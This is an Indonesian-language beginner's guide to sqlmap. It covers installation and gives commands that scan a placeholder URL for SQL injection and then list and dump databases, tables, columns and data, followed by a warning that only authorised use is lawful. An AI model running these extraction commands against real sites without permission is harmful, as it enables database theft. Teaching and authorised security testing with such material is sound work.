üìò Apa itu Sqlmap?

Sqlmap adalah alat penetrasi open-source canggih yang digunakan untuk mendeteksi dan mengeksploitasi kerentanan SQL Injection dalam berbagai sistem database. SQL Injection adalah teknik serangan yang mengeksploitasi celah keamanan dalam aplikasi web untuk memanipulasi database di baliknya.

cd sqlmap
python3 sqlmap.py -h

Linux (Ubuntu/Debian)

sudo apt update
sudo apt install sqlmap -y

üîç Penggunaan Dasar

Cek Versi

sqlmap --version

Scan URL untuk SQL Injection

sqlmap -u "http://contoh.com/halaman.php?id=1" --batch

Ekstrak Daftar Database

sqlmap -u "http://contoh.com/halaman.php?id=1" --dbs --batch

Ekstrak Daftar Tabel dari Database

sqlmap -u "http://contoh.com/halaman.php?id=1" -D nama_database --tables --batch

Ekstrak Kolom dari Tabel Tertentu

sqlmap -u "http://contoh.com/halaman.php?id=1" -D nama_database -T nama_tabel --columns --batch

Ekstrak Data dari Kolom Tertentu

sqlmap -u "http://contoh.com/halaman.php?id=1" -D nama_database -T nama_tabel -C kolom1,kolom2 --dump --batch

‚ö†Ô∏è Peringatan Penting

Perhatian! Sqlmap hanya boleh digunakan untuk:

  • Pengujian keamanan dengan izin resmi
  • Kegiatan penetrasi yang sah
  • Evaluasi kerentanan sistem milik sendiri

Penggunaan tanpa izin adalah pelanggaran hukum dan dapat dikenakan sanksi pidana!
